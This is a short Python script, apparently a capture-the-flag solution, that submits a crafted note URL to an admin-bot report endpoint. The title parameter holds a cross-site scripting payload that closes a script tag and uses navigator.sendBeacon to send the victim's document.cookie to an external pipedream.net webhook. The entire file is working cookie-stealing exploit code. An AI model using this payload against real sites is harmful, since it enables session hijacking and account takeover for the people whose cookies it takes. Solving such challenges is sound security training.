import os
import httpx
import urllib.parse


HOOK_URL = "https://eoipim5aylm6ri7.m.pipedream.net"
HOST = "34.170.146.252"
BOT_PORT = 44755

client = httpx.Client(base_url=f"http://{HOST}:{BOT_PORT}")

payload = urllib.parse.quote("</script>$`navigator.sendBeacon('https://eoipim5aylm6ri7.m.pipedream.net?' + document.cookie);</script>")

res = client.post(
    "/api/report",
    json={
        "url": f"http://web:3000/note?title={payload}"},
        timeout=10,
    )
print(res.text)
